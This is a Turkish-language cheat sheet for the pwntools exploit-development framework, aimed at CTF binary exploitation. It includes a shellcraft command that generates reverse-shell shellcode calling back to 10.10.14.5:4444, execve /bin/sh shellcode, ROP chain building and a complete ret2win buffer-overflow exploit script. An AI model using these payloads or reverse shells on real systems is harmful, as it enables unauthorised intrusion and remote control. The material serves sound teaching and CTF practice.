# pwntools Bilgi Notu (Cheatsheet)

[pwntools](https://github.com/Gallopsled/pwntools), ikili istismar (binary exploitation - pwn) ve CTF yarışmaları için Python ile geliştirilmiş dünyanın en popüler exploit geliştirme çatısıdır. Hızlı prototipleme, tersine mühendislik ve kabuk kodu (shellcode) üretimi için zengin bir Python API'si ile birlikte terminalden doğrudan kullanılabilen komut satırı araçları (`pwn cyclic`, `pwn checksec`, `pwn asm`, `pwn shellcraft`) sunar.

---

## İçindekiler

- [Temel Yetenekler](#temel-yetenekler)
- [Kurulum](#kurulum)
- [Komut Satırı Araçları (`pwn <komut>`)](#komut-satırı-araçları-pwn-komut)
  - [`pwn cyclic` (Yığın Taşması Offset Hesaplama)](#pwn-cyclic-yığın-taşması-offset-hesaplama)
  - [`pwn checksec` (İkili Güvenlik Önlemleri Denetimi)](#pwn-checksec-i̇kili-güvenlik-önlemleri-denetimi)
  - [`pwn asm` & `pwn disasm` (Çevirici & Tersine Çevirici)](#pwn-asm--pwn-disasm-çevirici--tersine-çevirici)
  - [`pwn shellcraft` (Kabuk Kodu Üreteci)](#pwn-shellcraft-kabuk-kodu-üreteci)
  - [`pwn template` (Exploit İskelet Şablonu)](#pwn-template-exploit-i̇skelet-şablonu)
- [Python ile Exploit Geliştirme İş Akışı](#python-ile-exploit-geliştirme-i̇ş-akışı)
  - [Süreç (Process) ve Uzak Soket Bağlantıları](#süreç-process-ve-uzak-soket-bağlantıları)
  - [ELF Sembolleri ve Fonksiyon Adresleri](#elf-sembolleri-ve-fonksiyon-adresleri)
  - [Otomatik ROP Zinciri Oluşturma](#otomatik-rop-zinciri-oluşturma)
  - [Paketleme ve Endianness (`p32` / `p64`)](#paketleme-ve-endianness-p32--p64)
- [Eksiksiz Exploit Örneği (Buffer Overflow + ret2win)](#eksiksiz-exploit-örneği-buffer-overflow--ret2win)

---

## Temel Yetenekler

- **Tubes Mimarisi:** Yerel ikili süreçler (`process`), uzak TCP soketleri (`remote`) ve SSH oturumları için tek tip etkileşim arabirimi.
- **İkili Analiz & Sembol Çözme:** ELF başlıkları, fonksiyon adresleri, GOT ve PLT tablolarını otomatik ayrıştırma.
- **Anlık Derleme (Assembly):** x86, x86_64, ARM, MIPS ve AArch64 mimarilerinde assembly talimatlarını anında bayt koduna dönüştürme.
- **Hazır Shellcode Kütüphanesi:** Ters bağlantı (reverse shell), execve `/bin/sh` ve dosya okuma yüklerini parametrelerle üretme.

---

## Kurulum

```bash
# Ubuntu / Debian / Kali Linux
sudo apt-get update && sudo apt-get install -y python3-pwntools

# Python pip ile kurulum
pip3 install pwntools

# Komut satırı araçlarını doğrulayın
pwn version
```

---

## Komut Satırı Araçları (`pwn <komut>`)

### `pwn cyclic` (Yığın Taşması Offset Hesaplama)
EIP / RIP yazmacının üzerine yazılan tam bayt mesafesini (offset) bulmak için benzersiz De Bruijn dizgisi üretin:

```bash
# 200 baytlık benzersiz taşma deseni üret
pwn cyclic 200

# Çökme adresindeki desenden tam offset mesafesini hesapla (örn. 0x6161616c)
pwn cyclic -l 0x6161616c
# Çıktı: 44 (EIP yazmacına ulaşmak için tam 44 bayt dolgu gereklidir)

# 64-bit mimaride desen arama
pwn cyclic -l "faaa" -n 8
```

### `pwn checksec` (İkili Güvenlik Önlemleri Denetimi)
ELF dosyasındaki koruma mekanizmalarını (Canary, NX, PIE, RELRO) terminalden denetleyin:
```bash
pwn checksec /path/to/binary
```

### `pwn asm` & `pwn disasm` (Çevirici & Tersine Çevirici)
Assembly komutlarını doğrudan terminalde makine koduna (hex bayt) dönüştürün:
```bash
# x86 talimatlarını bayt koduna çevir
pwn asm "xor eax, eax; push eax"

# 64-bit mimaride hex formatında derle
pwn asm -c amd64 "mov rax, 59; syscall" --format hex

# Ham hex baytlarını assembly koduna geri çevir (Disassemble)
pwn disasm "31c050682f2f7368682f62696e89e3505389e1b00bcd80" -c i386
```

### `pwn shellcraft` (Kabuk Kodu Üreteci)
Hazır kabuk kodlarını saniyeler içinde ekrana basın veya dosyaya kaydedin:
```bash
# Linux x64 execve /bin/sh kabuk kodunu hex formatında üret
pwn shellcraft amd64.linux.sh --format hex

# Ters bağlantı (Reverse TCP) kabuk kodu (IP: 10.10.14.5, Port: 4444)
pwn shellcraft amd64.linux.connect 10.10.14.5 4444

# Ham ikili baytları doğrudan dosyaya yazdır
pwn shellcraft amd64.linux.sh --format raw > shellcode.bin
```

### `pwn template` (Exploit İskelet Şablonu)
Hedef ikili dosya ve uzak sunucu için çalışan bir Python exploit şablonu üretin:
```bash
pwn template ./hedef_ikili --host 10.10.10.100 --port 1337 > exploit.py
```

---

## Python ile Exploit Geliştirme İş Akışı

### Süreç (Process) ve Uzak Soket Bağlantıları
```python
from pwn import *

# Hedef mimariyi ve log seviyesini belirleyin
context.arch = 'amd64'
context.log_level = 'debug'

# Yerel süreci başlatma
io = process('./hedef_program')

# Veya uzak CTF sunucusuna bağlanma
# io = remote('10.10.10.100', 1337)

# Veri alma ve gönderme
io.recvuntil(b'Lutfen adinizi girin: ')
io.sendline(b'Alice')

# Exploit tetiklendikten sonra etkileşimli kabuğa geç
io.interactive()
```

### ELF Sembolleri ve Fonksiyon Adresleri
GDB'de manuel arama yapmadan fonksiyon ve tablo adreslerini doğrudan çekin:
```python
elf = ELF('./hedef_program')
print(f"Hedef fonksiyon adresi: {hex(elf.symbols['win'])}")
print(f"puts() PLT adresi: {hex(elf.plt['puts'])}")
print(f"puts() GOT adresi: {hex(elf.got['puts'])}")
```

### Otomatik ROP Zinciri Oluşturma
Return-Oriented Programming zincirlerini otomatik derleyin:
```python
elf = ELF('./hedef_program')
rop = ROP(elf)

# win(0x1337, 0xdeadbeef) çağrısını hazırla
rop.win(0x1337, 0xdeadbeef)
print(rop.dump())

payload = b"A" * 40 + rop.chain()
```

### Paketleme ve Endianness (`p32` / `p64`)
Bellek adreslerini little-endian bayt dizilimine dönüştürün:
```python
# 32-bit little-endian paketleme
adres_32 = p32(0x080484b6)  # Donen deger: b'\xb6\x84\x04\x08'

# 64-bit little-endian paketleme
adres_64 = p64(0x0000000000401156)

# Baytlardan tamsayıya çözme
sayi = u64(b"\x56\x11\x40\x00\x00\x00\x00\x00")
```

---

## Eksiksiz Exploit Örneği (Buffer Overflow + ret2win)

```python
#!/usr/bin/env python3
from pwn import *

ikili_yol = './challenge'
context.binary = ikili_yol
context.log_level = 'info'

elf = ELF(ikili_yol)

# 1. Yerel veya uzak bağlantıyı başlat
if args.REMOTE:
    io = remote('target.ctf.local', 9999)
else:
    io = process(ikili_yol)

# 2. Saldırı yükünü hazırla
offset = 40
win_adresi = elf.symbols['win']

# Ubuntu 64-bit yığın hizalama (16-byte stack alignment) için ret gadget'ı ekle
rop = ROP(elf)
ret_gadget = rop.find_gadget(['ret'])[0]

payload = flat(
    asm('nop') * offset,
    ret_gadget,
    win_adresi
)

# 3. Yükü gönder
io.recvuntil(b'Mesajinizi yazin: ')
io.sendline(payload)

# 4. Etkileşimli kabuğa geç
log.success("Exploit basariyla gonderildi! Kabuk emrinizde:")
io.interactive()
```
